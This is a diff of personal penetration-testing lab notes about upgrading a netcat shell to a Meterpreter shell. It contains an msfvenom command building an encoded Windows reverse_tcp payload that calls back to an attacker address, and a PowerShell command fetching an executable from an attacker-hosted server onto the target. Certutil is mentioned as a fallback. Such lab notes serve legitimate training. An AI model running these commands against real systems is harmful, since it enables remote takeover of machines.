@@ -125,16 +125,17 @@ Time to upgrade our shells from a simple netcat shell to a meterpreter shell
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.78 LPORT=9090 -f exe -o SHELL.exe
 ```
-## Download the payload on the webserver 
+## Download the payload on the webserver 1
 1. We already have our python server running
 2. Lets download it from our attacker machine onto the webserver using the below command
 
 ```shell
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.75:8000/shell_main.exe','shell_main_.exe')"
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.3.69:9090/switch_shell.exe','switch_shell.exe')"
 ```
 
 ![[Pasted image 20251013221421.png]]
 
+## Download the payload on the webserver 2
 The above method was giving issues, so i tried using: Certutil
 
 ```
